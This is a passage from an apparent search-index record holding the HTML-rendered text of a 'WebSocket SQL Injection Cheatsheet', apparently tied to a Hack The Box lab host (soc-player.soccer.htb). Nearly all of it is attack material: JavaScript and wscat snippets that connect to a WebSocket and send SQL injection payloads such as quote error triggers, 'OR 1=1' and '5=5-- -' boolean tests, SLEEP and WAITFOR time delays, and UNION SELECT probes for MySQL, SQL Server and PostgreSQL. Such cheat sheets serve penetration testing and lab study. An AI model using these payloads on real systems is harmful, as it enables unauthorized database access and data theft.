queries.\n","permalink":"https://realspaceeagle.github.io/cheatsheets/websocket-sql-injection/","summary":"\u003ch1 id=\"websocket-sql-injection-cheatsheet\"\u003eWebSocket SQL Injection Cheatsheet\u003c/h1\u003e\n\u003ch2 id=\"websocket-basics\"\u003eWebSocket Basics\u003c/h2\u003e\n\u003ch3 id=\"websocket-connection\"\u003eWebSocket Connection\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Basic WebSocket connection\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ews\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eWebSocket\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ws://target.com:9091\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// With specific endpoint\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ews\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eWebSocket\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ws://soc-player.soccer.htb:9091\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Secure WebSocket\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ewss\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eWebSocket\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;wss://target.com:443/ws\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"websocket-message-format\"\u003eWebSocket Message Format\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// JSON message format\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;value_to_test\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Simple string message\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;test_value\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Complex JSON structure\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;action\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;query\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;data\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;vulnerable_parameter\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"testing-websocket-connections\"\u003eTesting WebSocket Connections\u003c/h2\u003e\n\u003ch3 id=\"manual-browser-testing\"\u003eManual Browser Testing\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Open browser console and connect\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ews\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eWebSocket\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ws://soc-player.soccer.htb:9091\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonopen\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Connected to WebSocket\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonmessage\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Received:\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Send test payloads\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"using-wscat\"\u003eUsing wscat\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Install wscat\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enpm install -g wscat\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Connect to WebSocket\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewscat -c ws://soc-player.soccer.htb:9091\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Send JSON payloads\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39;\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026#34;1 OR 1=1\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026#34;92130 or 5=1-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"sql-injection-detection\"\u003eSQL Injection Detection\u003c/h2\u003e\n\u003ch3 id=\"basic-detection-payloads\"\u003eBasic Detection Payloads\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Test for errors with single quote\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#39;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Test for boolean conditions\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1 AND 1=1\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1 AND 1=2\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Test for time delays\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1 AND SLEEP(5)\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39;; WAITFOR DELAY \u0026#39;0:0:5\u0026#39;--\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Test for union-based injection\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1 UNION SELECT 1,2,3\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"error-based-detection\"\u003eError-Based Detection\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// MySQL error triggers\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\\\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1`\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// SQL Server error triggers\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1]\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// PostgreSQL error triggers\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1$\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"boolean-based-detection\"\u003eBoolean-Based Detection\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// True condition\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;92130 or 5=5-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// False condition  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;92130 or 5=6-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// String 